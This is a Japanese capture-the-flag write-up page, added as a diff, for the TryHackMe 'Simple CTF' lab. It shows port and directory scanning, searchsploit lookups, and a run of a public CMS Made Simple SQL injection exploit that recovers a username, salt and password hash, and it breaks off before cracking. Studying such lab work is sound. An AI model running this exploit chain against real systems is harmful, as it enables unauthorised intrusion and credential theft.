@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Simple CTF Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Simple CTF</h1>
+    <p>Web/FTP 列挙、隠し CMS 認証情報、SSH、sudo vim GTFOBins。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p>まずはオプションをつけずに<code>nmap</code>を実施する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.49.136.159
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:26 +0900
+Nmap scan report for 10.49.136.159
+Host is up (0.13s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
+</code></pre>
+<p>vulnスキャンをかけてみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.49.136.159 --script=vuln
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:27 +0900
+Nmap scan report for 10.49.136.159
+Host is up (0.13s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+2222/tcp open  EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 44.77 seconds
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p>なにも出なかった。既知の脆弱性がないことがわかった。</p>
+<p>つづいて<code>feroxbuster</code>を実施する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ feroxbuster -u http://10.49.136.159
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.49.136.159/
+ 🚩  In-Scope Url          │ 10.49.136.159
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       15l       74w     6143c http://10.49.136.159/icons/ubuntu-logo.png
+200      GET      375l      968w    11321c http://10.49.136.159/
+404      GET        9l       33w      289c http://10.49.136.159/Reports%20List
+301      GET        9l       28w      315c http://10.49.136.159/simple =&gt; http://10.49.136.159/simple/
+404      GET        9l       33w      291c http://10.49.136.159/external%20files
+404      GET        9l       33w      290c http://10.49.136.159/Style%20Library
+301      GET        9l       28w      319c http://10.49.136.159/simple/tmp =&gt; http://10.49.136.159/simple/tmp/
+301      GET        9l       28w      319c http://10.49.136.159/simple/lib =&gt; http://10.49.136.159/simple/lib/
+301      GET        9l       28w      323c http://10.49.136.159/simple/modules =&gt; http://10.49.136.159/simple/modules/
+301      GET        9l       28w      321c http://10.49.136.159/simple/admin =&gt; http://10.49.136.159/simple/admin/
+301      GET        9l       28w      322c http://10.49.136.159/simple/assets =&gt; http://10.49.136.159/simple/assets/
+301      GET        9l       28w      323c http://10.49.136.159/simple/uploads =&gt; http://10.49.136.159/simple/uploads/
+301      GET        9l       28w      326c http://10.49.136.159/simple/lib/assets =&gt; http://10.49.136.159/simple/lib/assets/
+301      GET        9l       28w      327c http://10.49.136.159/simple/lib/classes =&gt; http://10.49.136.159/simple/lib/classes/
+301      GET        9l       28w      327c http://10.49.136.159/simple/lib/plugins =&gt; http://10.49.136.159/simple/lib/plugins/
+301      GET        9l       28w      324c http://10.49.136.159/simple/lib/lang =&gt; http://10.49.136.159/simple/lib/lang/
+301      GET        9l       28w      319c http://10.49.136.159/simple/doc =&gt; http://10.49.136.159/simple/doc/
+301      GET        9l       28w      325c http://10.49.136.159/simple/tmp/cache =&gt; http://10.49.136.159/simple/tmp/cache/
+301      GET        9l       28w      331c http://10.49.136.159/simple/tmp/templates_c =&gt; http://10.49.136.159/simple/tmp/templates_c/
+301      GET        9l       28w      332c http://10.49.136.159/simple/assets/templates =&gt; http://10.49.136.159/simple/assets/templates/
+301      GET        9l       28w      330c http://10.49.136.159/simple/assets/configs =&gt; http://10.49.136.159/simple/assets/configs/
+301      GET        9l       28w      336c http://10.49.136.159/simple/lib/classes/internal =&gt; http://10.49.136.159/simple/lib/classes/internal/
+301      GET        9l       28w      326c http://10.49.136.159/simple/lib/smarty =&gt; http://10.49.136.159/simple/lib/smarty/
+301      GET        9l       28w      334c http://10.49.136.159/simple/lib/smarty/plugins =&gt; http://10.49.136.159/simple/lib/smarty/plugins/
+301      GET        9l       28w      329c http://10.49.136.159/simple/lib/phpmailer =&gt; http://10.49.136.159/simple/lib/phpmailer/
+301      GET        9l       28w      342c http://10.49.136.159/simple/modules/MenuManager/images =&gt; http://10.49.136.159/simple/modules/MenuManager/images/
+301      GET        9l       28w      335c http://10.49.136.159/simple/modules/MenuManager =&gt; http://10.49.136.159/simple/modules/MenuManager/
+301      GET        9l       28w      345c http://10.49.136.159/simple/modules/MenuManager/templates =&gt; http://10.49.136.159/simple/modules/MenuManager/templates/
+301      GET        9l       28w      347c http://10.49.136.159/simple/modules/ModuleManager/templates =&gt; http://10.49.136.159/simple/modules/ModuleManager/templates/
+301      GET        9l       28w      345c http://10.49.136.159/simple/modules/AdminSearch/templates =&gt; http://10.49.136.159/simple/modules/AdminSearch/templates/
+301      GET        9l       28w      342c http://10.49.136.159/simple/modules/AdminSearch/images =&gt; http://10.49.136.159/simple/modules/AdminSearch/images/
+301      GET        9l       28w      335c http://10.49.136.159/simple/modules/AdminSearch =&gt; http://10.49.136.159/simple/modules/AdminSearch/
+301      GET        9l       28w      340c http://10.49.136.159/simple/modules/CMSMailer/images =&gt; http://10.49.136.159/simple/modules/CMSMailer/images/
+301      GET        9l       28w      343c http://10.49.136.159/simple/modules/CMSMailer/templates =&gt; http://10.49.136.159/simple/modules/CMSMailer/templates/
+301      GET        9l       28w      333c http://10.49.136.159/simple/modules/CMSMailer =&gt; http://10.49.136.159/simple/modules/CMSMailer/
+301      GET        9l       28w      330c http://10.49.136.159/simple/modules/Search =&gt; http://10.49.136.159/simple/modules/Search/
+301      GET        9l       28w      337c http://10.49.136.159/simple/modules/Search/images =&gt; http://10.49.136.159/simple/modules/Search/images/
+301      GET        9l       28w      340c http://10.49.136.159/simple/modules/Search/templates =&gt; http://10.49.136.159/simple/modules/Search/templates/
+301      GET        9l       28w      329c http://10.49.136.159/simple/admin/plugins =&gt; http://10.49.136.159/simple/admin/plugins/
+301      GET        9l       28w      330c http://10.49.136.159/simple/uploads/images =&gt; http://10.49.136.159/simple/uploads/images/
+301      GET        9l       28w      331c http://10.49.136.159/simple/admin/templates =&gt; http://10.49.136.159/simple/admin/templates/
+301      GET        9l       28w      336c http://10.49.136.159/simple/assets/module_custom =&gt; http://10.49.136.159/simple/assets/module_custom/
+301      GET        9l       28w      330c http://10.49.136.159/simple/assets/plugins =&gt; http://10.49.136.159/simple/assets/plugins/
+301      GET        9l       28w      335c http://10.49.136.159/simple/assets/admin_custom =&gt; http://10.49.136.159/simple/assets/admin_custom/
+301      GET        9l       28w      328c http://10.49.136.159/simple/admin/themes =&gt; http://10.49.136.159/simple/admin/themes/
+301      GET        9l       28w      329c http://10.49.136.159/simple/assets/images =&gt; http://10.49.136.159/simple/assets/images/
+301      GET        9l       28w      337c http://10.49.136.159/simple/modules/ModuleManager =&gt; http://10.49.136.159/simple/modules/ModuleManager/
+301      GET        9l       28w      344c http://10.49.136.159/simple/modules/ModuleManager/images =&gt; http://10.49.136.159/simple/modules/ModuleManager/images/
+301      GET        9l       28w      326c http://10.49.136.159/simple/assets/css =&gt; http://10.49.136.159/simple/assets/css/
+[####################] - 41s   810161/810161  0s      found:49      errors:789448 
+[####################] - 38s    30000/30000   782/s   http://10.49.136.159/ 
+[####################] - 30s    30000/30000   1008/s  http://10.49.136.159/simple/ 
+[####################] - 11s    30000/30000   2656/s  http://10.49.136.159/simple/modules/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 25s    30000/30000   1183/s  http://10.49.136.159/simple/admin/ 
+[####################] - 0s     30000/30000   120482/s http://10.49.136.159/simple/tmp/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 25s    30000/30000   1220/s  http://10.49.136.159/simple/lib/ 
+[####################] - 4s     30000/30000   6783/s  http://10.49.136.159/simple/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 25s    30000/30000   1195/s  http://10.49.136.159/simple/tmp/templates_c/ 
+[####################] - 24s    30000/30000   1226/s  http://10.49.136.159/simple/tmp/cache/ 
+[####################] - 24s    30000/30000   1233/s  http://10.49.136.159/simple/assets/configs/ 
+[####################] - 17s    30000/30000   1752/s  http://10.49.136.159/simple/assets/templates/ 
+[####################] - 24s    30000/30000   1245/s  http://10.49.136.159/simple/doc/ 
+[####################] - 14s    30000/30000   2182/s  http://10.49.136.159/simple/modules/ModuleManager/ 
+[####################] - 20s    30000/30000   1473/s  http://10.49.136.159/simple/modules/CMSMailer/ 
+[####################] - 14s    30000/30000   2104/s  http://10.49.136.159/simple/modules/Search/ 
+[####################] - 14s    30000/30000   2135/s  http://10.49.136.159/simple/modules/MenuManager/ 
+[####################] - 14s    30000/30000   2107/s  http://10.49.136.159/simple/modules/AdminSearch/ 
+[####################] - 21s    30000/30000   1442/s  http://10.49.136.159/simple/uploads/ 
+[####################] - 21s    30000/30000   1427/s  http://10.49.136.159/simple/assets/plugins/ 
+[####################] - 21s    30000/30000   1444/s  http://10.49.136.159/simple/assets/module_custom/ 
+[####################] - 21s    30000/30000   1427/s  http://10.49.136.159/simple/assets/admin_custom/ 
+[####################] - 20s    30000/30000   1488/s  http://10.49.136.159/simple/assets/css/ 
+[####################] - 20s    30000/30000   1527/s  http://10.49.136.159/simple/assets/images/ 
+[####################] - 14s    30000/30000   2169/s  http://10.49.136.159/simple/lib/plugins/ 
+[####################] - 7s     30000/30000   4209/s  http://10.49.136.159/simple/lib/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 19s    30000/30000   1595/s  http://10.49.136.159/simple/lib/classes/ 
+[####################] - 7s     30000/30000   4197/s  http://10.49.136.159/simple/lib/lang/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 9s     30000/30000   3173/s  http://10.49.136.159/simple/lib/smarty/ 
+[####################] - 14s    30000/30000   2220/s  http://10.49.136.159/simple/lib/phpmailer/ 
+[####################] - 14s    30000/30000   2152/s  http://10.49.136.159/simple/admin/plugins/ 
+[####################] - 14s    30000/30000   2195/s  http://10.49.136.159/simple/admin/templates/ 
+[####################] - 1s     30000/30000   32086/s http://10.49.136.159/simple/admin/themes/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 13s    30000/30000   2307/s  http://10.49.136.159/simple/uploads/images/                                                                                                                                                                                                                       
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p><code>/simple</code>というディレクトリを発見</p>
+<p>また再度<code>--script=vuln</code>を実施したところ異なる結果が出た</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.49.136.159 --script=vuln
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:31 +0900
+Nmap scan report for 10.49.136.159
+Host is up (0.14s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_      http://ha.ckers.org/slowloris/
+| http-enum: 
+|_  /robots.txt: Robots file
+2222/tcp open  EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 332.98 seconds
+
+</code></pre>
+<p>httpのポートに脆弱性があるようだ</p>
+<pre><code class="language-bash">
+Matching Modules
+================
+
+   #  Name                          Disclosure Date  Rank    Check  Description
+   -  ----                          ---------------  ----    -----  -----------
+   0  auxiliary/dos/http/slowloris  2009-06-17       normal  No     Slowloris Denial of Service Attack
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/dos/http/slowloris
+
+msf &gt; 
+</code></pre>
+<p>metasploitでもmoduleを見つけたがdos攻撃してどうするねんという感じ</p>
+<p><code>-sC</code>オプションをつけてnmapしてみた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.49.136.159 -sC
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:33 +0900
+Nmap scan report for 10.49.136.159
+Host is up (0.13s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.205.211
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  EtherNetIP-1
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+
+Nmap done: 1 IP address (1 host up) scanned in 42.17 seconds
+
+</code></pre>
+<p>・ftpはバージョン３を使っていて強そう<br>
+・２２２２番でなぜかSSHが動いているけど謎</p>
+<p>feroxbusterで見つけた<code>/simple</code>のディレクトリを掘ってみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ whatweb http://10.49.136.159/simple
+http://10.49.136.159/simple [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.136.159], RedirectLocation[http://10.49.136.159/simple/], Title[301 Moved Permanently]
+http://10.49.136.159/simple/ [200 OK] Apache[2.4.18], CMS-Made-Simple[2.2.8], Cookies[CMSSESSIDd6a5f2400115], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.136.159], JQuery[1.11.1], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Script[text/javascript], Title[Home - Pentest it]
+
+</code></pre>
+<p>simpleというサービスのバージョンが<code>2.2.8</code>であることが分かった</p>
+<p><code>searchsploit</code>でkaliの中にエクスプロイトコードがないか調べる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ searchsploit Simple 2.2.8                      
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+CMS Made Simple &lt; 2.2.10 - SQL Injection                                                                                  | php/webapps/46635.py
+Simple PHP Agenda 2.2.8 - 'edit_event.php?eventid' SQL Injection                                                          | php/webapps/26136.txt
+Simple PHP Agenda 2.2.8 - Cross-Site Request Forgery (Add Admin / Add Event)                                              | php/webapps/18694.txt
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p>SQLiとCSRFのコードが見つかった</p>
+<p>再度<code>nmap</code>を実施する<br>
+<code>-sC</code>でデフォルトのサービス情報を読み込み<br>
+<code>-sV</code>で各ポートのサービスバージョンを調べ<br>
+<code>-oX output.xml</code>でXMLファイルに出力する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ nmap 10.49.142.133 -sC -sV -oX output.tml
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 08:09 +0900
+Nmap scan report for 10.49.142.133
+Host is up (0.13s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.205.211
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 49.18 seconds
+
+</code></pre>
+<p><code>--nmap output.xml</code>でこれらのサービスに関わるエクスプロイトを検索する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ searchsploit --nmap output.xml 
+[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
+[i] Reading: 'output.xml'
+
+[-] Skipping term: ftp   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ftp)
+
+[i] /usr/bin/searchsploit -t vsftpd
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remot | linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service           | linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb
+vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
+vsftpd 3.0.3 - Remote Denial of Service    | multiple/remote/49719.py
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+[i] /usr/bin/searchsploit -t vsftpd 3.0.3
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+vsftpd 3.0.3 - Remote Denial of Service    | multiple/remote/49719.py
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+[-] Skipping term: http   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t http)
+
+[i] /usr/bin/searchsploit -t apache httpd
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'tes | cgi/remote/20435.txt
+Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape S | multiple/dos/19536.txt
+Apache Httpd mod_proxy - Error Page Cross- | multiple/webapps/47688.md
+Apache Httpd mod_rewrite - Open Redirects  | multiple/webapps/47689.md
+NCSA 1.3/1.4.x/1.5 / Apache HTTPd 0.8.11/0 | multiple/remote/20595.txt
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+[i] /usr/bin/searchsploit -t apache httpd 2.4.18
+[-] Skipping term: ssh   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ssh)
+
+[i] /usr/bin/searchsploit -t openssh
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+Debian OpenSSH - (Authenticated) Remote SE | linux/remote/6094.txt
+Dropbear / OpenSSH Server - 'MAX_UNAUTH_CL | multiple/dos/1572.pl
+FreeBSD OpenSSH 3.5p1 - Remote Command Exe | freebsd/remote/17462.txt
+glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x | linux/local/258.sh
+Novell Netware 6.5 - OpenSSH Remote Stack  | novell/dos/14866.txt
+OpenSSH 1.2 - '.scp' File Create/Overwrite | linux/remote/20253.sh
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration   | linux/remote/45233.py
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration ( | linux/remote/45210.py
+OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off | unix/remote/21314.txt
+OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token | linux/remote/21402.txt
+OpenSSH 3.x - Challenge-Response Buffer Ov | unix/remote/21578.txt
+OpenSSH 3.x - Challenge-Response Buffer Ov | unix/remote/21579.txt
+OpenSSH 4.3 p1 - Duplicated Block Remote D | multiple/dos/2444.sh
+OpenSSH 6.8 &lt; 6.9 - 'PTY' Local Privilege  | linux/local/41173.c
+OpenSSH 7.2 - Denial of Service            | linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Comm | multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration       | linux/remote/40136.py
+OpenSSH &lt; 6.6 SFTP (x64) - Command Executi | linux_x86-64/remote/45000.c
+OpenSSH &lt; 6.6 SFTP - Command Execution     | linux/remote/45001.py
+OpenSSH &lt; 7.4 - 'UsePrivilegeSeparation Di | linux/local/40962.txt
+OpenSSH &lt; 7.4 - agent Protocol Arbitrary L | linux/remote/40963.txt
+OpenSSH &lt; 7.7 - User Enumeration (2)       | linux/remote/45939.py
+OpenSSH SCP Client - Write Arbitrary Files | multiple/remote/46516.py
+OpenSSH server (sshd) 9.8p1 - Race Conditi | linux/remote/52269.c
+OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Us | linux/remote/26.sh
+OpenSSH/PAM 3.6.1p1 - Remote Users Discove | linux/remote/25.c
+OpenSSHd 7.2p2 - Username Enumeration      | linux/remote/40113.txt
+Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Tim | multiple/remote/3303.sh
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+[i] /usr/bin/searchsploit -t openssh 7.2p2 ubuntu 4ubuntu2.8
+</code></pre>
+<p>simpleに関するエクスプロイトが取れなかった<br>
+nmapの出力結果にないので当たり前だ</p>
+<p>素直に<code>whatweb http://[ip address]/simple</code>の結果から探した</p>
+<pre><code class="language-bash">──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ searchsploit CMS Made Simple 2.2.8
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+CMS Made Simple &lt; 2.2.10 - SQL Injection   | php/webapps/46635.py
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ 
+
+</code></pre>
+<p>見つかったのでこれをカレントディレクトリに持ってきて実行する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ searchsploit -m 46635             
+  Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection
+      URL: https://www.exploit-db.com/exploits/46635
+     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
+    Codes: CVE-2019-9053
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/rkametani/tryhackme/simple/46635.py
+
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ ls
+46635.py  output.xml
+</code></pre>
+<p><code>cat</code>でpythonコードの中身を見ていき使い方を把握する<br>
+<code>parser.add_argument('-t', '--target')</code>のような行があればそれがオプション指定になる</p>
+<pre><code class="language-python">parser = optparse.OptionParser()
+parser.add_option('-u', '--url', action=&quot;store&quot;, dest=&quot;url&quot;, help=&quot;Base target uri (ex. http://10.10.10.100/cms)&quot;)
+parser.add_option('-w', '--wordlist', action=&quot;store&quot;, dest=&quot;wordlist&quot;, help=&quot;Wordlist for crack admin password&quot;)
+parser.add_option('-c', '--crack', action=&quot;store_true&quot;, dest=&quot;cracking&quot;, help=&quot;Crack password with wordlist&quot;, default=False)
+</code></pre>
+<p>上記の3行が見つかった<br>
+<code>-c</code>がよく分からないのでいったん無視して<code>-u</code>と<code>-w</code>を指定してみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ ./46635.py -u http://10.49.142.133/simple -w /usr/share/wordlists/rockyou.txt
+  File &quot;/home/rkametani/tryhackme/simple/./46635.py&quot;, line 25
+    print &quot;[+] Specify an url target&quot;
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ 
+</code></pre>
+<p>しかし構文エラーが出てしまった<br>
+エラー文言を検索してみる</p>
+<p>10年前のQiita記事が見つかった。曰く、</p>
+<hr>
+<h1>python3 から print の書き方が変わった</h1>
+<p>何だこれおかしいと思ったら、python3 から書き方が変わったのを知りませんでした😓</p>
+<pre><code>print &quot;Hello world&quot;  # python 2.x
+
+Is now
+
+print(&quot;Hello world&quot;)   # python 3.x
+</code></pre>
+<p><code>print("hoge")</code> に変更したら動きました</p>
+<hr>
+<p>とのこと。<br>
+vimでこの変更をしてみる。</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ vim 46635.py
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ cat 46635.py | grep print
+from termcolor import cprint
+    print (&quot;[+] Specify an url target&quot;)
+    print (&quot;[+] Example usage (no cracking password): exploit.py -u http://target-uri&quot;)
+    print (&quot;[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist&quot;)
+    print (&quot;[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.&quot;)
+        beautify_print_try(line)
+def beautify_print_try(value):
+    print (&quot;\033c&quot;)
+    cprint(output,'green', attrs=['bold'])
+    cprint('[*] Try: ' + value, 'red', attrs=['bold'])
+def beautify_print():
+    print (&quot;\033c&quot;)
+    cprint(output,'green', attrs=['bold'])
+            beautify_print_try(temp_salt)
+            beautify_print_try(temp_password)
+            beautify_print_try(temp_db_name)
+            beautify_print_try(temp_email)
+    print (colored(&quot;[*] Now try to crack password&quot;))
+beautify_print()
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ 
+
+</code></pre>
+<p>変更した。<br>
+もう一度、実行してみる</p>
+<pre><code class="language-bash">[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ 
+</code></pre>
+<p>それらしき結果が出た<br>
+出てきたのはパスワードのハッシュ値のようだ。<br>
+ソルトがあるのでオフラインクラックを試みる。<br>
+これが出来なかった場合、ユーザー名は分かっているのでhydraとrockyouでブルートフォースする</p>
+<p>まず<code>ハッシュ：ソルト</code>の形でテキストファイルに入れる</p>
